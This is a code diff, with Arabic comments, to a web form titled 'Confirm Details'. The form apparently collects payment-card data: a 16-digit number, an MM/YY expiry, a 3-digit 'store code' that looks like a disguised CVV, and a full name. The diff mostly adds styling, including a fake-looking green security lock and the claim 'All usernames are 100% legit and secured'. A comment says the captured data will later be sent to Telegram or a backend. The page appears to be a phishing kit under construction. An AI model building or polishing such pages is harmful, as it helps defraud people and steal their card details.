@@ -14,11 +14,11 @@
 
     body {
       background-color: #f5f5f5;
-      display: flex;
-      justify-content: center;
-      align-items: flex-start;
       min-height: 100vh;
-      padding: 40px 10px;
+      display: flex;
+      justify-content: center;   /* وسط أفقياً */
+      align-items: center;       /* وسط عمودياً */
+      padding: 20px 10px;
     }
 
     /* الإطار الخارجي */
@@ -29,7 +29,7 @@
       padding: 20px 20px 30px;
       max-width: 420px;
       width: 100%;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+      box-shadow: 0 2px 4px rgba(0,0,0,0.06);
     }
 
     /* سطر القفل + النص */
@@ -40,17 +40,41 @@
       gap: 10px;
     }
 
+    /* قفل أخضر مبني بـ CSS (شكله أنظف من الإيموجي) */
     .lock-icon {
-      width: 26px;
-      height: 26px;
+      width: 24px;
+      height: 24px;
       border-radius: 4px;
-      border: 2px solid #11aa3d;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #11aa3d;
-      font-size: 16px;
+      border: 2px solid #16a34a;
+      position: relative;
+      background-color: #ffffff;
       flex-shrink: 0;
+    }
+
+    .lock-icon::before {
+      content: "";
+      position: absolute;
+      left: 50%;
+      top: 3px;
+      width: 12px;
+      height: 8px;
+      border: 2px solid #16a34a;
+      border-bottom: none;
+      border-radius: 999px 999px 0 0;
+      transform: translateX(-50%);
+      background-color: #ffffff;
+    }
+
+    .lock-icon::after {
+      content: "";
+      position: absolute;
+      left: 50%;
+      bottom: 3px;
+      width: 12px;
+      height: 9px;
+      background-color: #16a34a;
+      border-radius: 2px;
+      transform: translateX(-50%);
     }
 
     .security-text {
@@ -152,15 +176,15 @@
 <body>
 
   <div class="outer-card">
-    <!-- القفل + النص الأخضر -->
+    <!-- القفل + النص -->
     <div class="security-row">
-      <div class="lock-icon">🔒</div>
+      <div class="lock-icon"></div>
       <div class="security-text">
         All usernames are 100% legit and secured
       </div>
     </div>
 
-    <!-- البوكس الداخلي (النموذج) -->
+    <!-- البوكس الداخلي -->
     <div class="inner-card">
       <h2 class="form-title">Confirm Details</h2>
 
@@ -173,7 +197,7 @@
             id="number"
             name="number"
             placeholder="XXXX XXXX XXXX XXXX"
-            maxlength="19"  <!-- 16 رقم + 3 مسافات -->
+            maxlength="19"
             autocomplete="off"
             inputmode="numeric"
           />
@@ -214,7 +238,6 @@
             type="text"
             id="fullName"
             name="fullName"
-            placeholder=""
             autocomplete="off"
           />
           <div class="hint">* Full Name</div>
@@ -226,10 +249,10 @@
   </div>
 
   <script>
-    // السماح بالأرقام فقط + تنسيق رقم الـ Number 4-4-4-4
+    // Number: أرقام فقط + تنسيق 4-4-4-4
     const numberInput = document.getElementById("number");
     numberInput.addEventListener("input", (e) => {
-      let digits = e.target.value.replace(/\D/g, "").slice(0, 16); // فقط 16 رقم
+      let digits = e.target.value.replace(/\D/g, "").slice(0, 16);
       let parts = [];
       for (let i = 0; i < digits.length; i += 4) {
         parts.push(digits.substring(i, i + 4));
@@ -237,31 +260,31 @@
       e.target.value = parts.join(" ");
     });
 
-    // تاريخ MM/YY مع / تلقائية وأرقام فقط
+    // Date: MM/YY مع / تلقائية
     const dateInput = document.getElementById("date");
     dateInput.addEventListener("input", (e) => {
-      let digits = e.target.value.replace(/\D/g, "").slice(0, 4); // 4 أرقام فقط
+      let digits = e.target.value.replace(/\D/g, "").slice(0, 4);
       if (digits.length >= 3) {
         e.target.value = digits.slice(0, 2) + "/" + digits.slice(2);
-      } else if (digits.length >= 1) {
-        e.target.value = digits;
       } else {
-        e.target.value = "";
+        e.target.value = digits;
       }
     });
 
-    // كود متجرنا: أرقام فقط + 3 خانات كحد أقصى
+    // كود المتجر: 3 أرقام فقط
     const storeCodeInput = document.getElementById("storeCode");
     storeCodeInput.addEventListener("input", (e) => {
       e.target.value = e.target.value.replace(/\D/g, "").slice(0, 3);
     });
 
-    // منع الريفريش / الإرسال الحقيقي حالياً
-    document.getElementById("usernameForm").addEventListener("submit", (e) => {
-      e.preventDefault();
-      // هنا لاحقاً نربط تيليجرام أو أي باك إند
-      console.log("Form captured");
-    });
+    // منع الإرسال الحقيقي حالياً
+    document
+      .getElementById("usernameForm")
+      .addEventListener("submit", (e) => {
+        e.preventDefault();
+        // هنا لاحقاً تربط تيليجرام أو أي باك إند
+        console.log("Form captured");
+      });
   </script>
 
 </body>
